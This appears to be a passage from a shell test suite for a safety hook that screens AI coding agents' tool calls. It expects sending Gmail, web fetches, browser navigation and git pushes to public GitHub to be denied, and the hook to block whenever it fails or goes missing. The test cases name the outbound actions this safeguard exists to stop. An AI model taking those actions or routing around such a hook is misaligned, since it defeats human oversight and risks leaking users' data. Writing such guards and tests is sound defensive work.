  if grep -q '    # Shell: only git push' "$T/m/guard.ps1"; then
    "$PY" - "$T/m/guard.ps1" "$T/broken/guard.ps1" <<'PY'
import os, sys
s = open(sys.argv[1], encoding='utf-8').read()
k = '    # Shell: only git push'
os.makedirs(os.path.dirname(sys.argv[2]), exist_ok=True)
open(sys.argv[2], 'w', encoding='utf-8').write(s.replace(k, '    throw "boom"\n' + k, 1))
PY
    RUN="\"$PS\" $PSA -File \"$(native "$T/broken/guard.ps1")\""
    check "error, gmail search -> deny (risky tool)" deny '{"tool_name":"mcp__claude_ai_Gmail__search_threads","tool_input":{}}'
    check "error, WebFetch -> deny" deny '{"tool_name":"WebFetch","tool_input":{"url":"https://x.com"}}'
    check "error, browser -> deny" deny '{"tool_name":"mcp__Claude_Browser__navigate","tool_input":{"url":"https://x.com"}}'
    check "error, Bash git $PU -> deny" deny "$(shelljson "$TN/pub" "git $PU")"
    check "error, Bash ls -> allow (not risky)" allow "$(shelljson "$TN/pub" 'ls')"
    check "error, interview tool -> allow (not risky)" allow '{"tool_name":"mcp__interview-room__interview_say","tool_input":{}}'
    RUN="$RUN_DEFAULT"
  else
    skip "error-injection cases" "the marker comment they hook into is gone from guard.ps1"
  fi
  check "PowerShell: Set-Location; git $PU, public (deny)" deny "$(shelljson "$TN" "Set-Location pub; git $PU" shell_command)"
fi

if [ "$IMPL" = sh ]; then
  echo "== fail-closed wrappers (.claude/settings.json, .codex/hooks.json)"
  hookcmd() { "$PY" -c 'import json,sys; d=json.load(open(sys.argv[1])); print(d["hooks"][sys.argv[2]][0]["hooks"][0][sys.argv[3]])' "$@"; }
  SC="$(hookcmd "$REPO/.claude/settings.json" PreToolUse command)"
  CC="$(hookcmd "$REPO/.codex/hooks.json" PreToolUse command)"
  mkdir -p "$T/proj/.claude/hooks"
  printf 'exit 3\n' > "$T/proj/.claude/hooks/guard.sh"
  RUN="$SC" check "settings.json cmd, guard exits 3 -> block" block2 '{"tool_name":"WebFetch","tool_input":{"url":"https://x.com"}}'
  printf 'if then fi\n' > "$T/proj/.claude/hooks/guard.sh"
  RUN="$SC" check "settings.json cmd, guard syntax error -> block" block2 '{"tool_name":"WebFetch","tool_input":{"url":"https://x.com"}}'
  cp "$T/m/guard.sh" "$T/proj/.claude/hooks/guard.sh"
  RUN="$SC" check "settings.json cmd, real guard, gmail search -> allow" allow '{"tool_name":"mcp__claude_ai_Gmail__search_threads","tool_input":{}}'
  RUN="$SC" check "settings.json cmd, real guard, gmail send -> deny" deny '{"tool_name":"mcp__claude_ai_Gmail__send_message","tool_input":{}}'
  RUN="$SC" check "settings.json cmd, real guard, git $PU public -> deny" deny "$(shelljson "$TN/pub" "git $PU")"
  rm "$T/proj/.claude/hooks/guard.sh"
  RUN="$SC" check "settings.json cmd, guard missing -> block" block2 '{"tool_name":"WebFetch","tool_input":{"url":"https://x.com"}}'
  RUN="set +u; unset CLAUDE_PROJECT_DIR; $SC" check "settings.json cmd, CLAUDE_PROJECT_DIR unset -> block" block2 '{"tool_name":"WebFetch","tool_input":{"url":"https://x.com"}}'
  mkdir -p "$T/cproj/.claude/hooks/sub" "$T/noagents" && touch "$T/cproj/AGENTS.md" && cp "$T/m/guard.sh" "$T/cproj/.claude/hooks/guard.sh"
  RUN="cd \"$T/cproj/.claude/hooks/sub\" && $CC" check "codex cmd from a subfolder, gmail send -> deny" deny '{"tool_name":"mcp__gmail__send_email","tool_input":{}}'
  RUN="cd \"$T/cproj/.claude/hooks/sub\" && $CC" check "codex cmd from a subfolder, gmail search -> allow" allow '{"tool_name":"mcp__gmail__search_emails","tool_input":{}}'
  rm "$T/cproj/.claude/hooks/guard.sh"
  RUN="cd \"$T/cproj\" && $CC" check "codex cmd, guard missing -> block" block2 '{"tool_name":"mcp__gmail__search","tool_input":{}}'
  RUN="cd \"$T/noagents\" && $CC" check "codex cmd, no AGENTS.md found -> block" block2 '{"tool_name":"mcp__gmail__search","tool_input":{}}'
  RUN="$RUN_DEFAULT"

  echo "== .githooks/pre-push"
  H="$T/m/hooks/pre-push"
  if [ -n "$WIN" ] || [ -x "$PREPUSH" ]; then pass=$((pass + 1)); echo "PASS  pre-push is executable"
  else fail=$((fail + 1)); echo "FAIL  pre-push is not executable (git won't run it)"; fi
  pp() { # pp <name> <expected exit> <repo dir> <remote> [hook]
    local rc; (cd "$T/$3" && printf '' | bash "${5:-$H}" "$4" "$(git remote get-url "$4")" >"$T/ppout" 2>&1); rc=$?
    if [ "$rc" = "$2" ]; then pass=$((pass + 1)); printf 'PASS  %-62s exit %s\n' "$1" "$rc"
    else fail=$((fail + 1)); printf 'FAIL  %-62s expected %s got %s\n' "$1" "$2" "$rc"; sed 's/^/      | /' "$T/ppout"; fi
  }
  pp "pre-push, public GitHub (block)" 1 pub origin
  pp "pre-push, public GitHub via ssh URL (block)" 1 sshpub origin
  pp "pre-push, private/missing GitHub (allow)" 0 priv origin
  pp "pre-push, GitHub answers 500 (block)" 1 err origin
  pp "pre-push, gitlab (allow)" 0 other origin
  pp "pre-push, GitHub unreachable (block)" 1 priv origin "$T/off/pre-push"
  if grep -q 'no-verify' "$T/ppout"; then fail=$((fail + 1)); echo "FAIL  pre-push unreachable message suggests bypassing the check"
  else pass=$((pass + 1)); echo "PASS  pre-push unreachable message gives no bypass advice"; fi
  if [ -d "$T/alias" ]; then
    export PATH="$T/bin:$PATH"
    pp "pre-push, SSH alias for GitHub, public (block)" 1 alias origin
    pp "pre-push, SSH alias, private (allow)" 0 aliaspriv origin
    pp "pre-push, SSH alias for another server (allow)" 0 othersrv origin
    pp "pre-push, local folder remote (allow)" 0 localpath origin
    export PATH="$OLDPATH"
  fi
  # End to end through git itself (core.hooksPath), pushing only to local bare repos.
  git -C "$T" init -q --bare bare.git
  mkdir -p "$T/fake/github.com/octocat" && git -C "$T/fake/github.com/octocat" init -q --bare Hello-World.git
  for r in pub priv; do
    git -C "$T/$r" config core.hooksPath "$TN/m/hooks"
    git -C "$T/$r" commit -q --allow-empty -m init
  done
  # git hands the hook the push URL: a local path that looks like github.com/octocat/Hello-World (public).
  git -C "$T/pub" config remote.origin.pushurl "$TN/fake/github.com/octocat/Hello-World.git"
  git -C "$T/priv" config remote.origin.pushurl "$TN/bare.git"
  if git -C "$T/pub" "$PU" -q origin HEAD:refs/heads/x >"$T/e2e" 2>&1; then fail=$((fail + 1)); echo "FAIL  e2e: git $PU to a public repository was not stopped"
  elif grep -q 'PUBLIC' "$T/e2e"; then pass=$((pass + 1)); echo "PASS  e2e: real git $PU to public GitHub stopped by pre-push"
  else fail=$((fail + 1)); echo "FAIL  e2e: failed, but not because of the hook:"; sed 's/^/      | /' "$T/e2e"; fi
  if git -C "$T/priv" "$PU" -q origin HEAD:refs/heads/x >"$T/e2e2" 2>&1; then pass=$((pass + 1)); echo "PASS  e2e: real git $PU to a non-GitHub (local) URL allowed"
  else fail=$((fail + 1)); echo "FAIL  e2e: allowed case failed"; sed 's/^/      | /' "$T/e2e2"; fi
fi

if [ "$IMPL" = ps ]; then
  echo "== Codex Windows wrappers (base64 commandWindows in .codex/hooks.json)"
  enc() { "$PY" -c 'import json,sys; d=json.load(open(sys.argv[1])); print(d["hooks"][sys.argv[2]][0]["hooks"][0]["commandWindows"].split("-EncodedCommand ")[1].strip())' "$REPO/.codex/hooks.json" "$1"; }
  EPT="$(enc PreToolUse)"; ESS="$(enc SessionStart)"; EAW="$(enc PostToolUse)"
  W="$T/wrap"; mkdir -p "$W/proj/.claude/hooks" "$W/proj/sub/deeper" "$W/noagents"; touch "$W/proj/AGENTS.md"
  wrun() { # wrun <name> <expected rc> <deny|allow|-> <cwd> <encoded> <stdin>
    local out rc got=allow
    out="$(cd "$4" && printf '%s' "$6" | "$PS" -NoProfile -NonInteractive -EncodedCommand "$5" 2>"$T/stderr.txt")"; rc=$?
    printf '%s' "$out" | grep -qE '"permissionDecision"[[:space:]]*:[[:space:]]*"deny"' && got=deny
    if [ "$rc" = "$2" ] && { [ "$3" = - ] || [ "$got" = "$3" ]; }; then pass=$((pass + 1)); printf 'PASS  %-62s rc=%s %s\n' "$1" "$rc" "$got"
    else fail=$((fail + 1)); printf 'FAIL  %-62s rc=%s %s (want rc=%s %s)\n      out=%s\n      err=%s\n' "$1" "$rc" "$got" "$2" "$3" "$out" "$(head -c 600 "$T/stderr.txt")"; fi
  }
  SEND='{"tool_name":"mcp__gmail__send_email","tool_input":{}}'
  SEARCH='{"tool_name":"mcp__gmail__search_emails","tool_input":{}}'
  cp "$T/m/guard.ps1" "$W/proj/.claude/hooks/guard.ps1"
  wrun "PreToolUse wrapper, root cwd, gmail send -> deny" 0 deny "$W/proj" "$EPT" "$SEND"
  wrun "PreToolUse wrapper, nested cwd, gmail send -> deny" 0 deny "$W/proj/sub/deeper" "$EPT" "$SEND"
  wrun "PreToolUse wrapper, gmail search -> allow" 0 allow "$W/proj/sub" "$EPT" "$SEARCH"
  BIG="$("$PY" -c 'import json; print(json.dumps({"tool_name":"mcp__gmail__send_email","tool_input":{"body":"x"*200000}}))')"
  wrun "PreToolUse wrapper, 200KB input, send -> deny" 0 deny "$W/proj" "$EPT" "$BIG"
  printf 'exit 3\n' > "$W/proj/.claude/hooks/guard.ps1"
  wrun "PreToolUse wrapper, guard exits 3 -> block (exit 2)" 2 - "$W/proj" "$EPT" "$SEARCH"
  printf 'if ( {\n' > "$W/proj/.claude/hooks/guard.ps1"
  wrun "PreToolUse wrapper, guard syntax error -> block (exit 2)" 2 - "$W/proj" "$EPT" "$SEARCH"
  printf 'throw "x"\n' > "$W/proj/.claude/hooks/guard.ps1"
  wrun "PreToolUse wrapper, guard throws -> block (exit 2)" 2 - "$W/proj" "$EPT" "$SEARCH"
  printf '[Console]::In.ReadToEnd() | Out-Null\n' > "$W/proj/.claude/hooks/guard.ps1"
  wrun "PreToolUse wrapper, guard with no explicit exit -> block" 2 - "$W/proj" "$EPT" "$SEARCH"
  rm "$W/proj/.claude/hooks/guard.ps1"
  wrun "PreToolUse wrapper, guard missing -> block (exit 2)" 2 - "$W/proj" "$EPT" "$SEARCH"
  wrun "PreToolUse wrapper, no AGENTS.md anywhere -> block" 2 - "$W/noagents" "$EPT" "$SEARCH"
  if grep -q 'Safety check could not run' "$T/stderr.txt"; then pass=$((pass + 1)); echo "PASS  block message on stderr"
  else fail=$((fail + 1)); echo "FAIL  no block message on stderr"; fi
  # SessionStart / PostToolUse wrappers: they find the workspace from a subfolder and never block.
  cp "$REPO/.claude/hooks/session-start.ps1" "$REPO/.claude/hooks/after-write.ps1" "$W/proj/.claude/hooks/"
  mkdir -p "$W/proj/jobs/acme-role"
  out="$(cd "$W/proj/jobs/acme-role" && printf '{}' | "$PS" -NoProfile -NonInteractive -EncodedCommand "$ESS" 2>"$T/stderr.txt")"; rc=$?
  if [ "$rc" = 0 ] && printf '%s' "$out" | grep -q '"SessionStart"'; then pass=$((pass + 1)); echo "PASS  SessionStart wrapper from a subfolder, fresh workspace (no user files)"
  else fail=$((fail + 1)); printf 'FAIL  SessionStart wrapper rc=%s\n      out=%s\n      err=%s\n' "$rc" "$out" "$(head -c 600 "$T/stderr.txt")"; fi
  out="$(cd "$W/proj/jobs/acme-role" && printf '%s' '{"tool_name":"apply_patch","tool_input":{"command":"*** Begin Patch\n*** Update File: jobs/tracker.csv\n*** End Patch"}}' | "$PS" -NoProfile -NonInteractive -EncodedCommand "$EAW" 2>"$T/stderr.txt")"; rc=$?
  if [ "$rc" = 0 ]; then pass=$((pass + 1)); echo "PASS  PostToolUse wrapper from a subfolder exits 0"
  else fail=$((fail + 1)); printf 'FAIL  PostToolUse wrapper rc=%s\n      out=%s\n      err=%s\n' "$rc" "$out" "$(head -c 600 "$T/stderr.txt")"; fi
  out="$(cd "$W/noagents" && printf '{}' | "$PS" -NoProfile -NonInteractive -EncodedCommand "$ESS" 2>&1)"; rc=$?
  if [ "$rc" = 0 ] && [ -z "$out" ]; then pass=$((pass + 1)); echo "PASS  SessionStart wrapper, no AGENTS.md: quiet exit 0"
  else fail=$((fail + 1)); echo "FAIL  SessionStart wrapper, no AGENTS.md: rc=$rc out=$out"; fi
fi

echo
echo "guard fixtures ($IMPL): passed $pass, failed $fail, skipped $skipped"
[ "$fail" -eq 0 ]
